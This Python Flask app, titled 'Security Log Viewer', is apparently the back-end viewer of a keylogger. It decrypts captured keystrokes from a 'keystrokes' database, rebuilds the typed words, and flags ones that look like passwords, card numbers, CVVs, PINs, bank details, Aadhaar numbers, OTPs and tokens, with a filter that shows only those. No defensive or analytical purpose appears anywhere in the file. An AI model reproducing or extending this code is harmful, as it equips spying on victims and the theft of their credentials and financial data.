from flask import Flask, render_template_string, request
import sqlite3
import os
from logger_utils import cipher

app = Flask(__name__)

HTML = """
<!doctype html>
<html>
<head>
  <title>🔐 Security Log Viewer</title>
  <meta http-equiv="refresh" content="5">  <!-- Auto-refresh every 5 seconds -->
  <style>
    body { font-family: Arial, sans-serif; margin: 20px; background: #f5f5f5; }
    h1 { color: #333; }
    form { margin-bottom: 20px; }
    input[type=text] { padding: 6px; width: 300px; }
    button { padding: 6px 12px; margin-right: 10px; }
    table { border-collapse: collapse; width: 100%; background: white; }
    th, td { border: 1px solid #ccc; padding: 8px; text-align: left; }
    th { background: #eee; }
    .sensitive { background: pink; color: red; font-weight: bold; }
  </style>
</head>
<body>
  <h1>🔐 Security Log Viewer</h1>
  
  <form method="get">
    <input type="text" name="q" placeholder="Search by keyword or app..." value="{{ query }}">
    <button type="submit">Search</button>
    <button type="submit" name="sensitive" value="1" {% if sensitive_only %}style="background:red;color:white;"{% endif %}>
      Sensitive Only
    </button>
  </form>
  
  <table>
    <tr><th>ID</th><th>Timestamp</th><th>Application</th><th>Key</th></tr>
    {% for row in logs %}
      <tr class="{{ 'sensitive' if row[0] in flagged_ids else '' }}">
        <td>{{ row[0] }}</td>
        <td>{{ row[1] }}</td>
        <td>{{ row[2] }}</td>
        <td>{{ row[3] }}</td>
      </tr>
    {% endfor %}
  </table>
  
  <p>Showing {{ logs|length }} logs. (Auto-refresh every 5s)</p>
</body>
</html>
"""

@app.route("/")
def index():
    query = request.args.get("q", "").strip().lower()
    sensitive_only = request.args.get("sensitive", "0") == "1"

    # Ensure DB exists
    db_path = os.path.abspath("logs.db")
    if not os.path.exists(db_path):
        return f"<h2>No logs found at {db_path}</h2>"

    # Fetch logs
    conn = sqlite3.connect("logs.db")
    cursor = conn.cursor()
    cursor.execute("SELECT * FROM keystrokes")
    rows = cursor.fetchall()
    conn.close()

    # Decrypt logs
    decrypted = []
    for row in rows:
        id, ts, app, key = row
        try:
            decrypted_key = cipher.decrypt(key.encode()).decode()
        except:
            decrypted_key = "[Decryption Error]"
        decrypted.append((id, ts, app, decrypted_key))

    # Apply search filter
    if query:
        decrypted = [row for row in decrypted if query in str(row).lower()]

    # Sensitive keywords
    sensitive_words = [
        "password", "pass", "login", "signin", "user", "username",
        "card", "credit", "debit", "cvv", "pin", "upi", "bank", "account",
        "email", "phone", "mobile", "aadhaar",
        "otp", "token", "key", "secret"
    ]

    # Reconstruct words & flag sensitive ones
    flagged_ids = set()
    current_word = ""
    current_ids = []

    for row in decrypted:
        log_id, _, _, key = row

        # Normal characters
        if len(key) == 1 and key.isprintable():
            current_word += key
            current_ids.append(log_id)

        # Space/Enter → end of word
        elif key in ["Key.space", "Key.enter"]:
            if current_word.lower() in sensitive_words:
                flagged_ids.update(current_ids)
            current_word = ""
            current_ids = []

        # Backspace → remove last char
        elif key == "Key.backspace":
            current_word = current_word[:-1]
            if current_ids:
                current_ids.pop()

    # Final word check
    if current_word.lower() in sensitive_words:
        flagged_ids.update(current_ids)

    # If toggle is ON → keep only sensitive logs
    if sensitive_only:
        decrypted = [row for row in decrypted if row[0] in flagged_ids]

    return render_template_string(
        HTML,
        logs=decrypted,
        query=query,
        flagged_ids=flagged_ids,
        sensitive_only=sensitive_only
    )


if __name__ == "__main__":
    app.run(debug=True)
